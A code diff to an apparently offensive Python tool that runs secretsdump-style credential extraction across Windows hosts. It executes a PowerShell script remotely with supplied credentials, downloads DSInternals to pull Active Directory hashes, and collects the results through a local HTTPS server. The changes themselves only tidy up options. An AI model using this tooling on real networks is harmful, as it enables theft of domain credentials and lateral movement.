@@ -16,7 +16,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 try:
     from exec_across_windows import execute_on_ip
 except ImportError:
-    print("[!] exec-across-windows not found. Install with: pip install exec-across-windows")
+    print("[!] exec-across-windows not found. Install with: pipx install exec-across-windows")
     sys.exit(1)
 
 DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
@@ -455,7 +455,7 @@ https_server = None
 print_lock = threading.Lock()
 
 
-def run_secretsdump(ip, username, password, just_dc_user, verbose, show_output, show_single_output):
+def run_secretsdump(ip, username, password, just_dc_user, verbose, show_single_output):
     
     with print_lock:
         print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
@@ -524,7 +524,7 @@ if ($isDC) {{
         # Use exec_across_windows to execute the PowerShell script
         # Suppress its output unless verbose is enabled
         if verbose:
-            result = execute_on_ip(username, ip, password, ps_script, tool_list=None, show_output=show_output)
+            result = execute_on_ip(username, ip, password, ps_script, tool_list=None)
         else:
             # Redirect exec_across_windows output to suppress it
             import io
@@ -532,7 +532,7 @@ if ($isDC) {{
             
             f = io.StringIO()
             with contextlib.redirect_stdout(f):
-                result = execute_on_ip(username, ip, password, ps_script, tool_list=None, show_output=False)
+                result = execute_on_ip(username, ip, password, ps_script, tool_list=None)
             # Release stdout lock before finalize_output so HTTP handler can print
         
         # Wait a moment for files to be uploaded and processed
@@ -594,7 +594,6 @@ def main(args):
                 args.password,
                 args.just_dc_user,
                 args.verbose,
-                args.show_output,
                 show_single_output
             )
             for ip in targets
@@ -625,8 +624,6 @@ def main_cli():
                         help="Extract only one user.")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Show exec_across_windows output")
-    parser.add_argument("-o", "--show-output", action="store_true",
-                        help="Show command output from target")
 
     args = parser.parse_args()
     main(args)
